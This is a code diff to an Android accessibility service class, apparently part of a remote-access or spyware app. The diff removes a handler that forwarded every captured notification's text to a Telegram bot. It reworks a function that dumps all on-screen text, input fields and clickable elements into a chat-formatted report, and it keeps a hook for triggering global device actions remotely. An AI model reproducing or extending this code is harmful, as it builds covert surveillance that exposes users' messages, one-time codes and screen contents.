@@ -10,19 +10,9 @@ public class ChimeraAccessibilityService extends AccessibilityService {
     private static ChimeraAccessibilityService instance;
 
     @Override
-    public void onAccessibilityEvent(AccessibilityEvent event) {
-        if (event.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
-            if (event.getText() != null && !event.getText().isEmpty()) {
-                String notificationText = event.getText().toString();
-                TelegramBotWorker.sendMessage("Notification Captured:\n" + notificationText, getApplicationContext());
-            }
-        }
-    }
+    public void onAccessibilityEvent(AccessibilityEvent event) { }
 
-    @Override
-    public void onInterrupt() {
-        instance = null;
-    }
+    @Override public void onInterrupt() { instance = null; }
 
     @Override
     protected void onServiceConnected() {
@@ -35,25 +25,16 @@ public class ChimeraAccessibilityService extends AccessibilityService {
         setServiceInfo(info);
     }
 
-    public static boolean isServiceEnabled() {
-        return instance != null;
-    }
+    public static boolean isServiceEnabled() { return instance != null; }
 
-    public static void triggerGlobalAction(int action) {
-        if (isServiceEnabled()) {
-            instance.performGlobalAction(action);
-        }
-    }
+    public static void triggerGlobalAction(int action) { if (isServiceEnabled()) instance.performGlobalAction(action); }
 
     public static String getScreenContent() {
-        if (!isServiceEnabled()) {
-            return "Error: Accessibility Service is not enabled.";
-        }
+        if (!isServiceEnabled()) return "Error: Accessibility Service is not enabled.";
         AccessibilityNodeInfo rootNode = instance.getRootInActiveWindow();
-        if (rootNode == null) {
-            return "Error: Could not get the root node. The screen might be locked or empty.";
-        }
-        StringBuilder sb = new StringBuilder("--- Screen Content ---\n");
+        if (rootNode == null) return "Error: Could not get the root node. The screen might be locked or empty.";
+        
+        StringBuilder sb = new StringBuilder("*--- Screen Content Dump ---*\n");
         dumpNode(rootNode, sb, 0);
         rootNode.recycle();
         return sb.toString();
@@ -61,22 +42,33 @@ public class ChimeraAccessibilityService extends AccessibilityService {
 
     private static void dumpNode(AccessibilityNodeInfo node, StringBuilder sb, int depth) {
         if (node == null) return;
+        
+        CharSequence className = node.getClassName();
+        if (className == null) return;
 
-        for (int i = 0; i < depth; i++) {
-            sb.append("  ");
-        }
+        String friendlyClassName = getFriendlyClassName(className.toString());
+        CharSequence text = node.getText();
+        CharSequence contentDesc = node.getContentDescription();
 
-        sb.append("[Class: ").append(node.getClassName());
-        if (node.getViewIdResourceName() != null) {
-            sb.append(", ID: ").append(node.getViewIdResourceName());
+        if (friendlyClassName != null || text != null || contentDesc != null) {
+            for (int i = 0; i < depth; i++) sb.append("  ");
+
+            if (friendlyClassName != null) {
+                sb.append("- *").append(friendlyClassName).append("*");
+                if (text != null || contentDesc != null) sb.append(": ");
+            }
+
+            if (text != null) {
+                sb.append("`").append(text).append("`");
+            } else if (contentDesc != null) {
+                sb.append("`").append(contentDesc).append("`");
+            }
+
+            if (node.isClickable()) {
+                sb.append(" (Clickable)");
+            }
+            sb.append("\n");
         }
-        if (node.getText() != null) {
-            sb.append(", Text: \"").append(node.getText()).append("\"");
-        }
-        if (node.getContentDescription() != null) {
-            sb.append(", Desc: \"").append(node.getContentDescription()).append("\"");
-        }
-        sb.append("]\n");
 
         for (int i = 0; i < node.getChildCount(); i++) {
             AccessibilityNodeInfo child = node.getChild(i);
@@ -85,5 +77,16 @@ public class ChimeraAccessibilityService extends AccessibilityService {
                 child.recycle();
             }
         }
+    }
+
+    private static String getFriendlyClassName(String rawClassName) {
+        if (rawClassName.contains("Button")) return "Button";
+        if (rawClassName.contains("EditText")) return "Input Field";
+        if (rawClassName.contains("TextView")) return "Text";
+        if (rawClassName.contains("ImageView")) return "Image";
+        if (rawClassName.contains("CheckBox")) return "Checkbox";
+        if (rawClassName.contains("RadioButton")) return "Radio Button";
+        if (rawClassName.contains("Switch")) return "Switch";
+        return null;
     }
 }
